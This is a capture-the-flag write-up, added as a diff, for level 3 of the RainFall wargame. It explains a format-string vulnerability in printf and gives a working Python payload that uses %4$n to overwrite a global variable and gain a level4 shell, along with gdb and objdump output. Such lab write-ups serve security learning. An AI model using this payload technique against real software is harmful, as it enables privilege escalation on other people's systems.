@@ -1,0 +1,132 @@
+# Level 03
+
+## Analysis
+
+We started to play with binary, it seems to read on stdin and print on stdout the string we passed.
+
+```bash
+level3@RainFall:~$ ./level3
+test
+test
+```
+
+After few random test we notice that program seems to doesn't segfault with a lot of char
+
+```bash
+level3@RainFall:~$ ./level3
+0xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde000
+0xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde000
+```
+
+We decompile binary with ghidra. We understood thats fgets function was protected but we found that printf is used with the user input we passed.
+
+For example:
+```bash
+level3@RainFall:~$ ./level3
+%p %p %p %p %p
+0x200 0xb7fd1ac0 0xb7ff37d0 0x25207025 0x70252070
+```
+
+We can use user input to print addresses from stack. Another things we found, is that there is call system to execute `/bin/sh` but it depend from global variable named `m`, and if this variable is equal to `64`, it create a shell.
+
+From this information we search a way to modify `m` variable from printf call.
+
+Few documentation where we learn how to perform this attack
+https://owasp.org/www-community/attacks/Format_string_attack
+https://www.it.uc3m.es/pbasanta/asng/course_notes/input_output_printf_en.html
+https://www.youtube.com/watch?v=0WvrSfcdq1I
+https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/11-Format3.md
+https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83
+https://airman604.medium.com/protostar-format-4-walkthrough-b8f73f414e59
+https://failingsilently.wordpress.com/2016/12/22/exploit-exercises-protostar/
+https://mislusnys.github.io/post/2016-06-26-protostar-format-string-levels/
+And many.. many.. many more
+
+So we learned that this is possible to perform writing data at arbitrary address with usage of [%n](https://www.it.uc3m.es/pbasanta/asng/course_notes/input_output_printf_en.html). But we need the address of global variable to do it, so let's go to find it.
+
+```bash
+level3@RainFall:~$ objdump -t  level3 | grep m
+level3:     file format elf32-i386
+080481b8 l    d  .dynsym	00000000              .dynsym
+08048618 l    d  .eh_frame_hdr	00000000              .eh_frame_hdr
+08048654 l    d  .eh_frame	00000000              .eh_frame
+0804974c l    d  .dynamic	00000000              .dynamic
+00000000 l    d  .comment	00000000              .comment
+08049884 l     O .bss	00000001              completed.6159
+08048480 l     F .text	00000000              frame_dummy
+08048734 l     O .eh_frame	00000000              __FRAME_END__
+0804974c l     O .dynamic	00000000              _DYNAMIC
+00000000       F *UND*	00000000              system@@GLIBC_2.0
+00000000  w      *UND*	00000000              __gmon_start__
+00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
+0804988c g     O .bss	00000004              m
+0804851a g     F .text	0000000d              main
+```
+
+We need also the position of format string to print store the global variable address (`0804988c`). It will be used later with %n as reference for writing data. We used pattern 'AAAA' to see where it stored and gdb to print stack.
+
+```bash
+(gdb) disassemble v
+Dump of assembler code for function v:
+   0x080484a4 <+0>:     push   %ebp
+   0x080484a5 <+1>:     mov    %esp,%ebp
+   0x080484a7 <+3>:     sub    $0x218,%esp
+   0x080484ad <+9>:     mov    0x8049860,%eax
+   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
+   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
+   0x080484be <+26>:    lea    -0x208(%ebp),%eax
+   0x080484c4 <+32>:    mov    %eax,(%esp)
+   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
+   0x080484d2 <+46>:    mov    %eax,(%esp)
+   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
+   0x080484da <+54>:    mov    0x804988c,%eax
+   0x080484df <+59>:    cmp    $0x40,%eax
+   0x080484e2 <+62>:    jne    0x8048518 <v+116>
+   0x080484e4 <+64>:    mov    0x8049880,%eax
+   0x080484e9 <+69>:    mov    %eax,%edx
+   0x080484eb <+71>:    mov    $0x8048600,%eax
+   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
+   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
+   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
+   0x08048504 <+96>:    mov    %eax,(%esp)
+   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
+   0x0804850c <+104>:   movl   $0x804860d,(%esp)
+   0x08048513 <+111>:   call   0x80483c0 <system@plt>
+   0x08048518 <+116>:   leave
+   0x08048519 <+117>:   ret
+End of assembler dump.
+(gdb) b *0x080484d5
+Breakpoint 1 at 0x80484d5
+(gdb) r
+Starting program: /home/user/level3/level3
+AAAA
+
+Breakpoint 1, 0x080484d5 in v ()
+(gdb) x/32x $esp
+0xbffff500:     0xbffff510      0x00000200      0xb7fd1ac0      0xb7ff37d0
+0xbffff510:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
+0xbffff520:     0xbffff578      0xb7fde2d4      0xb7fde334      0x00000007
+0xbffff530:     0x00000000      0xb7fde000      0xb7fff53c      0xbffff578
+0xbffff540:     0x00000040      0x00000b80      0x00000000      0xb7fde714
+0xbffff550:     0x00000098      0x0000000b      0x00000000      0x00000000
+0xbffff560:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff570:     0x00000000      0xb7fe765d      0xb7e3ebaf      0x080482bb
+```
+
+And now we get this address where 'AAAA' is store: `0xbffff510`. And we know that this address is at 4 space memory position from the stack pointer. Now let's build payload to override global variable. We created python script to write global variable instead of 'AAAA', so it will use 4 bytes to print this address, then we print 60 random char (any char will works), then we used %4$n to specify to printf that pointer used to write data is at 4 space memory from $esp.
+
+Here is the payload we used:
+```bash
+level3@RainFall:~$ (python -c 'import struct; print struct.pack("I", 0x804988c)+"A"*60+"%4$n"'; cat) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+
+level3@RainFall:~$ (python -c 'import struct; print struct.pack("I", 0x804988c)+"%60u"+"%4$n"'; cat) | ./level3
+�                                                         512
+Wait what?!
+whoami
+level4
+```
